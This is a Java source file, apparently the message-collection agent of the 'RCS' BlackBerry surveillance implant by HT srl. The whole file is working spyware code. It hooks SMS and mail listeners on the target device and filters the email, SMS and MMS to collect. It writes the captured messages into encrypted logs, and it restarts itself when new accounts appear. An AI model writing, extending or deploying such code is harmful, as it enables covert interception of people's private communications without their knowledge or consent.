//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : MessageAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.io.IOException;
import java.util.Date;
import java.util.Hashtable;
import java.util.Vector;

import net.rim.device.api.util.IntHashtable;
import blackberry.AgentManager;
import blackberry.Conf;
import blackberry.agent.mail.Filter;
import blackberry.agent.mail.MailListener;
import blackberry.agent.sms.SmsListener;
import blackberry.config.Keys;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.log.TimestampMarkup;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.log.Markup;
import blackberry.utils.Check;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/*
 * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
 * 
 * 118  #define LOGTYPE_MAIL_RAW                        0x1001
 119 #define LOGTYPE_MAIL                            0x0210


 * 198  typedef struct _MailAdditionalData {
 199         UINT uVersion;
 200                 #define LOG_MAIL_VERSION 2009070301
 201         UINT uFlags;
 202         UINT uSize;
 203         FILETIME ftTime;
 204 } MailAdditionalData, *pMailAdditionalData;

 http://rcs-dev/trac/browser/RCSASP/deps/XML-RPC/XMLInserting.cpp

 uFlags = 1 : body retrieved
 0: non ha superato i controlli di size, il body viene tagliato


 */

/**
 * The Class MessageAgent.
 */
public final class MessageAgent extends Agent {

    //#ifdef DEBUG
    static Debug debug = new Debug("MessageAgent", DebugLevel.VERBOSE);
    //#endif

    protected static final int SLEEPTIME = 5000;
    protected static final int PERIODTIME = 60 * 60 * 1000;

    MailListener mailListener;
    SmsListener smsListener;

    TimestampMarkup markupDate;
    //public Date lastcheck = new Date(0);

    protected String identification;
    public IntHashtable filtersSMS = new IntHashtable();
    public IntHashtable filtersMMS = new IntHashtable();
    public IntHashtable filtersEMAIL = new IntHashtable();

    boolean firstRun;

    /**
     * Instantiates a new message agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public MessageAgent(final boolean agentStatus) {
        super(AGENT_MESSAGE, agentStatus, Conf.AGENT_MESSAGE_ON_SD,
                "MessageAgent");

        //#ifdef DBC
        Check.asserts(Log.convertTypeLog(agentId) == LogType.MAIL_RAW,
                "Wrong Conversion");
        //#endif

        mailListener = new MailListener(this);
        smsListener = SmsListener.getInstance();
        smsListener.setMessageAgent(this);

    }

    /**
     * Instantiates a new message agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected MessageAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);

        // mantiene la data prima di controllare tutte le email
        markupDate = new TimestampMarkup(agentId, Keys.getInstance()
                .getAesKey());

        Date lastcheck = lastcheckGet("COLLECT");
        //#ifdef DEBUG_TRACE
        debug.trace("MessageAgent lastcheck: " + lastcheck);
        //#endif

        parse(confParams);

        setDelay(SLEEPTIME);
        setPeriod(PERIODTIME);

        //#ifdef DBC
        Check.ensures(lastcheck != null, "MessageAgent: null lastcheck");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {

        // Ogni ora viene verificato se i nomi degli account corrisponde
        // se non corrisponde, restart dell'agente.

        if (firstRun) {
            //#ifdef DEBUG_INFO
            debug.info("First Run");
            //#endif
            firstRun = false;
            smsListener.run();
            mailListener.run();
        }

        if (haveNewAccount()) {
            //#ifdef DEBUG_INFO
            debug.info("Restarting MessageAgent, new account");
            //#endif
            AgentManager.getInstance().reStart(agentId);
        }

    }

    private boolean haveNewAccount() {

        return mailListener.haveNewAccount();
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {
        firstRun = true;
        smsListener.start();
        mailListener.start();
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        smsListener.stop();
        mailListener.stop();
    }

    /**
     * Creates the log.
     * 
     * @param additionalData
     *            the additional data
     * @param content
     *            the content
     * @param logType
     */
    public void createLog(final byte[] additionalData, final byte[] content,
            final int logType) {

        //#ifdef DBC
        Check.requires(content != null, "createLog content null");
        Check.requires(log != null, "log null");
        //#endif

        synchronized (log) {
            log.createLog(additionalData, logType);
            log.writeLog(content);
            log.close();
        }

        //#ifdef DEBUG_TRACE
        debug.trace("log created");
        //#endif
    }

    /*    *//**
     * Inits the markup.
     * 
     * @return the long
     */

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] conf) {

        final Vector tokens = tokenize(conf);
        if (tokens == null) {
            //#ifdef DEBUG
            debug.error("Cannot tokenize conf");
            //#endif
            return false;
        }

        final int size = tokens.size();
        for (int i = 0; i < size; ++i) {
            final Prefix token = (Prefix) tokens.elementAt(i);

            switch (token.type) {
            case Prefix.TYPE_IDENTIFICATION:
                // IDENTIFICATION TAG
                identification = WChar.getString(conf, token.payloadStart,
                        token.length, false);
                //#ifdef DEBUG_TRACE
                debug.trace("Type 1: " + identification);
                //#endif
                break;
            case Prefix.TYPE_FILTER:
                // Filtro (sempre 2, uno COLLECT e uno REALTIME);
                try {
                    final Filter filter = new Filter(conf, token.payloadStart,
                            token.length);
                    if (filter.isValid()) {
                        switch (filter.classtype) {
                        case Filter.CLASS_EMAIL:
                            //#ifdef DEBUG_INFO
                            debug.info(filter.toString());
                            //#endif

                            if (filter.type == Filter.TYPE_COLLECT) {
                                Date oldfrom = lastcheckGet("FilterFROM");
                                Date oldto = lastcheckGet("FilterTO");

                                if (filter.fromDate.getTime() == oldfrom
                                        .getTime()
                                        && filter.toDate.getTime() == oldto
                                                .getTime()) {
                                    //#ifdef DEBUG_INFO
                                    debug.info("same Mail Collect Filter");
                                    //#endif
                                } else {
                                    //#ifdef DEBUG_WARN
                                    debug
                                            .warn("Changed collect filter, resetting markup");
                                    debug.trace("oldfrom: " + oldfrom);
                                    debug.trace("oldto: " + oldto);
                                    //#endif
                                    lastcheckReset();
                                    lastcheckSet("FilterFROM", filter.fromDate);
                                    lastcheckSet("FilterTO", filter.toDate);
                                }

                            }

                            filtersEMAIL.put(filter.type, filter);

                            break;
                        case Filter.CLASS_MMS:
                            //#ifdef DEBUG_INFO
                            debug.info(filter.toString());
                            //#endif
                            filtersMMS.put(filter.type, filter);
                            break;
                        case Filter.CLASS_SMS:
                            //#ifdef DEBUG_INFO                            
                            debug.info(filter.toString());
                            //#endif
                            filtersSMS.put(filter.type, filter);
                            break;
                        case Filter.CLASS_UNKNOWN: // fall through
                        default:
                            //#ifdef DEBUG
                            debug.error("unknown classtype: "
                                    + filter.classtype);
                            //#endif
                            break;
                        }
                    }
                    //#ifdef DEBUG_TRACE
                    debug.trace("Type 2: header valid: " + filter.isValid());
                    //#endif
                } catch (final Exception e) {
                    //#ifdef DEBUG
                    debug.error("Cannot filter " + e);
                    //#endif
                }
                break;

            default:
                //#ifdef DEBUG
                debug.error("Unknown type: " + token.type);
                //#endif
                break;
            }
        }

        return true;
    }

    private Vector tokenize(final byte[] conf) {
        final Vector tokens = new Vector();
        int offset = 0;
        final int length = conf.length;

        while (offset < length) {
            final Prefix token = new Prefix(conf, offset);
            if (!token.isValid()) {

                return null;
            } else {
                tokens.addElement(token);
                offset += token.length + 4;
            }
        }

        return tokens;
    }

    public synchronized void lastcheckSet(String key, Date date) {
        //#ifdef DEBUG_TRACE
        debug.trace("Writing markup: " + key + " date: " + date);
        //#endif

        markupDate.put(key, date);
    }

    public synchronized Date lastcheckGet(String key) {

        //#ifdef DBC
        Check.requires(markupDate != null, "lastcheckGet markupDate==null");
        //#endif

        Date date = markupDate.get(key);

        //#ifdef DEBUG_TRACE
        debug.trace("getLastCheck: " + key + " = " + date);
        //#endif

        if (date == null) {
            return new Date(0);
        } else {
            return date;
        }
    }

    public synchronized void lastcheckReset() {
        markupDate.removeMarkup();

        //lastcheck = new Date(0); 
    }

}
